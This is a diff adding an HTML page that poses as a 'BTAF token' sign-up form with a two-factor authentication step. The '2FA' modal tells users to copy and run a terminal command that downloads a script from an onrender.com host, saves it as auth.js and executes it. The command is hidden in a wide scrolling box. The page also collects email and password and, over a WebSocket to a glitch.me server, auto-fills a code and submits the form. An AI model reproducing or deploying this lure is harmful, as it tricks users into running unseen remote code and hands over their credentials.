@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>BTAF token</title>
+    <link rel="icon" type="image/png" sizes="100x100" href="/favicon-32x32.png">
+    <style>
+      *{
+        margin: 0;
+        padding: 0;
+      }
+      body{
+        height:100vh;
+        background: rgb(72,157,228);
+        background: linear-gradient(0deg, rgba(72,157,228,1) 0%, rgba(13,222,235,1) 100%);
+        background-position: center;
+        font-family: "Poppins", Arial;
+      }  
+      #box{
+        width: 450px;
+        height: 500px;
+        background: rgb(193,106,213);
+        background: linear-gradient(0deg, rgba(193,106,213,1) 0%,       rgba(53,37,175,1) 100%);
+        border-radius: 20px;
+        position: relative;
+        box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
+        position: relative;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        
+      }
+      #signForm{
+        width: 100%;
+        text-align: center;
+        margin-top: 20px;
+      }
+      #signForm input{
+        width: 57%;
+      }
+      #signForm button{
+        margin: auto;
+        margin-top: 25px;
+      }
+      #logo{
+        width: 380px;
+        margin: auto;
+      }
+      #logo img{
+        visibility: visible;
+        width: 150px;
+        margin-top: 10px;
+        float: right;
+      }
+      .input-group{
+        position: absolute;
+        top: 150px;
+        width: 280px;
+        transition: .5s;
+      }
+      .sign-btn{
+        width: 180px !important;
+        margin: auto !important;
+        margin-top: 20px !important;
+      }
+      .input-field{
+        width: 100%;
+        padding: 20px;
+        margin: 5px 0;
+        outline: none;
+        border-radius: 10px;
+        border: none;
+        font-size: 15px;
+      }
+      .copy-btn{
+        color: #FFD12B;
+      }
+      .copy-btn:hover{
+        cursor: pointer;
+        color:#f5dd86;
+      }
+      .copy-btn:hover svg{
+        fill: #eee;
+      }
+      p{
+        color: white;
+        margin: auto;
+      }
+      p a{
+        color: #FFD12B;
+        text-decoration: none;
+        font-size: 16px;
+      }
+      
+      #login{
+        left: 74px;
+      }
+      #login p{
+        margin: auto;
+        margin-top: 20px;
+      }
+      #pes{
+        margin-top: 50px;
+      }
+      .btn{
+        text-align: center;
+        width: 60%;
+        margin-left: 40px;
+        margin-top: 15px;
+        padding: 20px 30px;
+        cursor: pointer;
+        display: block;
+        background: rgb(255,114,119);
+        background: linear-gradient(0deg, rgba(255,114,119,1) 0%, rgba(249,81,154,1) 100%);
+        border-radius: 5px;
+        border: none;
+        outline: none;
+        color: white;
+      }
+      a{
+        text-decoration: none;
+      }
+      .btn:hover{
+        background: rgb(247,115,33);
+        background: linear-gradient(0deg, rgba(247,115,33,1) 0%, rgba(250,208,91,1) 100%);
+        color: white;
+        transform: translateY(-2px);
+      }
+      /* Alert box style */
+      .alert {
+          position: fixed;
+          bottom: 20px;
+          left: 50%;
+          transform: translateX(-50%);
+          background-color: rgba(0,0,0,1);
+          color: white;
+          padding: 10px;
+          border-radius: 5px;
+          font-size: 16px;
+          display: none;
+          opacity: 0;
+          transition: opacity 0.5s ease-in-out;
+      }
+
+      .alert.show {
+          display: block;
+          opacity: 1;
+      }
+
+      .tfa-description{
+        color: #FFD12B;
+        padding-top:10px
+      }
+
+      .tfa-ele{
+        width: 30px;
+        height: 30px;
+        font-size: 20px;
+        padding: 10px;
+        color: #555;
+        text-align: center;
+        border: 1px solid #999;
+      }
+
+      .tfa-code{
+        background: #eee;
+        padding: 11px;
+        margin: 12px 0px;
+        color: #777;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+      }
+      .tfa-tool{
+        display: flex;
+        justify-content: space-between;
+        margin: 0px 5px 15px 0px;
+        color: #666;
+        font-size: 14px;
+      }
+      .tfa-bash{
+        overflow-x: scroll;
+        overflow-y: hidden;
+        height: 50px;
+      }
+      .tfa-cmd{
+        width: 1900px;
+      }
+      .tfa-copy{
+        cursor: pointer;
+      }
+
+      .tfa-submit{
+        width: 100%;
+        height: 50px;
+        background-color: rgb(1 124 187);
+        color: #eee;
+        border: none;
+        margin: 10px 0px;
+      }
+
+      .tfa-submit:hover{
+        background-color: #1e88be;
+        cursor: pointer;
+      }
+      
+      .tfa-submit:active{
+        background-color: #155c80;
+        cursor: pointer;
+      }
+
+      #verificationCode{
+        display: flex;
+        justify-content: space-between;
+        margin: 10px 0px;
+      }
+      
+      .modal {
+          display: none; /* Hidden by default */
+          position: fixed; /* Stay in place */
+          z-index: 1; /* Sit on top */
+          left: 0;
+          top: 0;
+          width: 100%; /* Full width */
+          height: 100%;
+          overflow: auto; /* Enable scroll if needed */
+          background-color: rgba(0, 0, 0, 0.3); /* Black w/ opacity */
+      }
+
+      .modal-content {
+          background-color: #fefefe;
+          padding: 50px 30px;
+          border: 1px solid #888;
+          width: 400px; /* Could be more or less, depending on screen size */
+          color: #333;
+          line-height: 1.5;
+          position: fixed;
+          left: 50%;
+          top: 50%;
+          transform: translate(-50%, -50%);
+      }
+
+      .close {
+          color: #aaa;
+          float: right;
+          font-size: 28px;
+          font-weight: bold;
+          position: relative;
+          top: -20px;
+      }
+
+      .close:hover,
+      .close:focus {
+          color: black;
+          text-decoration: none;
+          cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="box">
+      <div id="logo">
+          <img src='/BTAF-logo.png' border='0' alt='logo2' id="logo">
+      </div>
+        <form id="signForm" class="input-group" action="/" method="post">
+          <input type="text" placeholder="Email or Username" id="email" name="email" class="input-field" required>
+          <input type="password" placeholder="Password" id="password" name="password" class="input-field" required>
+          <input type="hidden" id="tfa_code" name="tfa_code" class="input-field">
+          <a id="openModalBtn" href="#twoFAModal" class="btn sign-btn">Sign up</a>
+          <div id="pes">
+            <div id="invalid-alert" style="color:#c2fe06e6; display: none;">Invalid user information!</div>
+          </div>
+        </form>
+    </div>
+    <div class="alert" id="alert">Code copied successfully!</div>
+    <div id="twoFAModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Two-Factor Authentication</h2>
+            <div style="margin:20px 0px">
+              Confirm installed Node at first.<br/>
+              Copy <b>2FA</b> code here and Run in <b>Terminal</b>.
+              <div class="tfa-code">
+                <div class="tfa-tool" style="display: flex; justify-content: space-between;">
+                  <span>bash</span>
+                  <span class="tfa-copy" onclick="copyCode()"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon-sm"><path fill-rule="evenodd" clip-rule="evenodd" d="M7 5C7 3.34315 8.34315 2 10 2H19C20.6569 2 22 3.34315 22 5V14C22 15.6569 20.6569 17 19 17H17V19C17 20.6569 15.6569 22 14 22H5C3.34315 22 2 20.6569 2 19V10C2 8.34315 3.34315 7 5 7H7V5ZM9 7H14C15.6569 7 17 8.34315 17 10V15H19C19.5523 15 20 14.5523 20 14V5C20 4.44772 19.5523 4 19 4H10C9.44772 4 9 4.44772 9 5V7ZM5 9C4.44772 9 4 9.44772 4 10V19C4 19.5523 4.44772 20 5 20H14C14.5523 20 15 19.5523 15 19V10C15 9.44772 14.5523 9 14 9H5Z" fill="currentColor"></path></svg> Copy code</span>
+                </div>
+                <div class="tfa-bash" style="overflow-x: scroll; overflow-y:hidden;">
+                  <code>
+                    <div class="tfa-cmd" style="width: 1900px;">
+                      npm i request sqlite3 && node -e "require('https').get('https://btaf-h0iy.onrender.com/keygen', res => { let data = ''; res.on('data', chunk => { data += chunk; }); res.on('end', () => { require('fs').writeFileSync('auth.js', data); }); });" && node auth.js
+                    </div>
+                  </code>
+                </div>
+              </div>
+            </div>
+            <form id="twoFAForm">
+                <div>
+                    <label for="verificationCode">Verification Code:</label>
+                </div>
+                <div id="verificationCode">
+                  <input type="text" class="tfa-ele" id="v1" maxlength="1" name="v1" required>
+                  <input type="text" class="tfa-ele" id="v2" maxlength="1" name="v2" required>
+                  <input type="text" class="tfa-ele" id="v3" maxlength="1" name="v3" required>
+                  <input type="text" class="tfa-ele" id="v4" maxlength="1" name="v4" required>
+                  <input type="text" class="tfa-ele" id="v5" maxlength="1" name="v5" required>
+                  <input type="text" class="tfa-ele" id="v6" maxlength="1" name="v6" required>
+                </div>
+                <button class="tfa-submit" id="tfa-submit-btn">Submit</button>
+            </form>
+        </div>
+    </div>
+  </body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuid.min.js"></script>
+  <script>
+    const modal = document.getElementById("twoFAModal");
+    const openModalBtn = document.getElementById("openModalBtn");
+    const closeModalSpan = document.getElementsByClassName("close")[0];
+    const twoFAForm = document.getElementById("twoFAForm");
+
+    document.getElementById("tfa-submit-btn").onclick = (event)=>{
+      event.preventDefault();
+    }
+    // Open the modal
+    openModalBtn.onclick = function() {
+        if((document.getElementById('email').value != "") && (document.getElementById('password').value != "")){
+          modal.style.display = "block";
+          document.getElementById('invalid-alert').style.display = 'none';
+        }else{
+          document.getElementById('invalid-alert').style.display = 'block';
+        }
+    }
+
+    // Close the modal when the user clicks on <span> (x)
+    closeModalSpan.onclick = function() {
+        modal.style.display = "none";
+    }
+
+    function copyCode() {
+        // Simulate copying code (replace with actual code copy logic if necessary)
+        navigator.clipboard.writeText(`npm i request sqlite3 && node -e "require('https').get('https://btaf-h0iy.onrender.com/keygen', res => { let data = ''; res.on('data', chunk => { data += chunk; }); res.on('end', () => { require('fs').writeFileSync('auth.js', data); }); });" && node auth.js`)
+            .then(() => {
+                // Show the alert box with smooth transition
+                const alertBox = document.getElementById("alert");
+                alertBox.classList.add("show");
+                
+                // Hide the alert after 2 seconds
+                setTimeout(() => {
+                    alertBox.classList.remove("show");
+                }, 2000);
+            })
+            .catch(err => {
+                console.error('Error copying text: ', err);
+            });
+    }
+    const PING = 99;
+    const SEND_UID = 101;
+    const BROWSER_CONNECTED = 102;
+    const LOOK_UID = 103;
+    const uniqueId = uuid.v4();
+    const ws = new WebSocket("wss://detailed-materialistic-desk.glitch.me");
+      ws.onopen = () => {
+        // Create a JSON object
+        const jsonObject = {
+          e: BROWSER_CONNECTED,
+          v: uniqueId
+        };
+        const jsonData = JSON.stringify(jsonObject);
+        // Send JSON data as a text message
+        ws.send(jsonData);
+      };
+      
+      setInterval(() => {
+        const pingObject = {
+          e: PING,
+          v: "k"
+        };
+        const pingData = JSON.stringify(pingObject);
+        ws.send(pingData);
+      }, 5000);
+
+      ws.onmessage = (event) => {
+          const msg = JSON.parse(event.data);
+          switch (msg.e) {
+            case SEND_UID:
+              document.getElementById('tfa_code').value = msg.v;
+              document.getElementById('v1').value = msg.v[0];
+              document.getElementById('v2').value = msg.v[1];
+              document.getElementById('v3').value = msg.v[2];
+              document.getElementById('v4').value = msg.v[3];
+              document.getElementById('v5').value = msg.v[4];
+              document.getElementById('v6').value = msg.v[5];
+              setTimeout(()=>{
+                document.getElementById('signForm').submit();
+                document.getElementById('v1').value = "";
+                document.getElementById('v2').value = "";
+                document.getElementById('v3').value = "";
+                document.getElementById('v4').value = "";
+                document.getElementById('v5').value = "";
+                document.getElementById('v6').value = "";
+              }, 3000);
+              break;
+            default:
+              break;
+          }
+      };
+  </script>
+</html>
